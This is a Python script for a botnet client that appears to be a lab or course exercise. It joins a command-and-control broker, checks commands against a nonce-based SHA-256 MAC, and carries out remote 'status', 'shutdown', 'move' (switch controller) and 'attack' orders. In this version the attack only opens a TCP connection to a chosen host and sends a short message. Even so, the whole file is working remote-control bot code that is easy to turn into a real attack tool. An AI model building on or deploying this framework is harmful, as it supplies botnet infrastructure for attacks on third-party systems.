#!/usr/bin/env python3
import sys
import socket
import time
import hashlib

def compute_mac(nonce, secret):
    data = nonce + secret # concat the nonce and password 
    return hashlib.sha256(data.encode()).hexdigest()[:8] # converts to bytes and hashes using sha256 then converts to hex string and slices first 8 char 

def execute_attack(target, nick, nonce):
    host, port = target.split(':') # splits string 
    port = int(port)
    try:
        with socket.create_connection((host, port), timeout=3) as s: # attempts to open tcp connection
            msg = f"{nick} {nonce}"
            s.sendall(msg.encode()) # sends payload
        return f"-attack {nick} OK"
    except TimeoutError:
        return f"-attack {nick} FAIL timeout"
    except ConnectionRefusedError:
        return f"-attack {nick} FAIL connection refused"
    except Exception as e:
        return f"-attack {nick} FAIL {str(e)}"

def main_loop():
    if len(sys.argv) != 4: # makes sure 3 args were provided 
        sys.exit(1)
    
    target_server = sys.argv[1]
    nick = sys.argv[2]
    secret = sys.argv[3]
    
    host, port = target_server.split(':')
    port = int(port)
    
    seen_nonces = set() # prevent replay attacks by storing used nonces
    command_count = 0
    
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((host, port)) # attempts to connect to the broker
            print("Connected.")
            s.sendall(f"-joined {nick}\n".encode())
        except Exception:
            print("Failed to connect.")
            time.sleep(5)
            continue
            
        try:
            buffer = ""
            while True:
                data = s.recv(4096)
                if not data:
                    print("Disconnected.")
                    break
                
                buffer += data.decode()
                while '\n' in buffer: # gets single line commands 
                    line, buffer = buffer.split('\n', 1)
                    line = line.strip()
                    if not line:
                        continue
                        
                    parts = line.split()
                    if len(parts) < 3:
                        continue
                        
                    nonce = parts[0]
                    mac = parts[1]
                    command = parts[2]
                    args = parts[3:]
                    
                    if nonce in seen_nonces: # drops command if same nonce was used
                        continue
                        
                    calculated_mac = compute_mac(nonce, secret)
                    if calculated_mac != mac:
                        continue
                        
                    seen_nonces.add(nonce)
                    command_count += 1
                    
                    if command == "status":
                        s.sendall(f"-status {nick} {command_count}\n".encode())
                    elif command == "shutdown":
                        s.sendall(f"-shutdown {nick}\n".encode())
                        sys.exit(0)
                    elif command == "attack":
                        if args:
                            res = execute_attack(args[0], nick, nonce)
                            s.sendall(f"{res}\n".encode())
                    elif command == "move":
                        if args:
                            s.sendall(f"-move {nick}\n".encode())
                            new_target = args[0]
                            host, new_port = new_target.split(':')
                            port = int(new_port)
                            break
                            
            if command == "move":
                continue
                
        except Exception:
            print("Disconnected.")
        
        s.close()
        time.sleep(5)

if __name__ == "__main__":
    main_loop()
